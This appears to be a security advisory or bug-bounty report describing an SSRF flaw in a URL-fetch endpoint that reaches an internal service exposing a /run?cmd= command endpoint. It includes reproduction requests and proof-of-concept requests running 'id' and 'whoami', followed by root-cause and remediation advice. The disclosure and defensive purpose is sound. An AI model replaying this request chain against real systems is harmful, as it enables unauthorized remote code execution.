# 🛡️ [Critical] SSRF Leading to Remote Code Execution via Internal Service

---

## 📌 Summary

A critical vulnerability chain was identified in the application, where a Server-Side Request Forgery (SSRF) vulnerability could be leveraged to access an internal service that executes system commands, resulting in Remote Code Execution (RCE).

This issue allows an attacker to execute arbitrary commands on the server without authentication.

---

## 🎯 Severity

**Critical**

---

## 🧩 Affected Endpoint

```
GET /fetch?url=
```

---

## 🔍 Description

The application exposes a functionality that fetches external resources based on user-supplied URLs. Due to insufficient validation, it is possible to supply internal URLs, allowing the server to interact with internal services.

During testing, an internal service was discovered running on:

```
http://127.0.0.1:5000
```

This service exposes an endpoint that executes system commands:

```
/run?cmd=
```

By chaining SSRF with this internal service, an attacker can achieve full Remote Code Execution.

---

## ⚙️ Steps to Reproduce

### 1. Intercept Request

```
GET /fetch?url=https://example.com HTTP/1.1
Host: target.com
```

---

### 2. Trigger SSRF

```
GET /fetch?url=http://127.0.0.1:5000 HTTP/1.1
Host: target.com
```

---

### 3. Access Internal Command Execution Endpoint

```
GET /fetch?url=http://127.0.0.1:5000/run?cmd=id HTTP/1.1
Host: target.com
```

---

### 4. Observe Response

```
uid=1000(www-data) gid=1000(www-data)
```

---

## 💥 Proof of Concept (PoC)

```
GET /fetch?url=http://127.0.0.1:5000/run?cmd=whoami
```

Response:

```
www-data
```

---

## 📊 Impact

* Remote command execution on internal server
* Full compromise of application infrastructure
* Access to sensitive data and configuration files
* Potential lateral movement within internal network

---

## 🛡️ Root Cause

1. Lack of validation on user-controlled URL input (SSRF)
2. Internal service exposing command execution functionality
3. Absence of authentication and network segmentation

---

## 🔒 Remediation

### SSRF Mitigation

* Implement strict allowlist for external URLs
* Block access to internal IP ranges (127.0.0.1, 169.254.x.x)
* Disable unnecessary URL fetching features

### Internal Service Protection

* Restrict access to internal services via firewall rules
* Require authentication for sensitive endpoints
* Remove or secure command execution functionality

---

## 🧠 Additional Notes

* This vulnerability becomes critical due to chaining multiple issues
* Internal services should never trust requests from local network blindly
* Proper segmentation and validation could have prevented this issue

---

## 📌 References

* OWASP SSRF Guide
* OWASP Top 10 – A10: Server-Side Request Forgery

---

## 🏁 Conclusion

This vulnerability demonstrates how a seemingly moderate SSRF issue can escalate into full Remote Code Execution when combined with insecure internal services. Immediate remediation is strongly recommended.
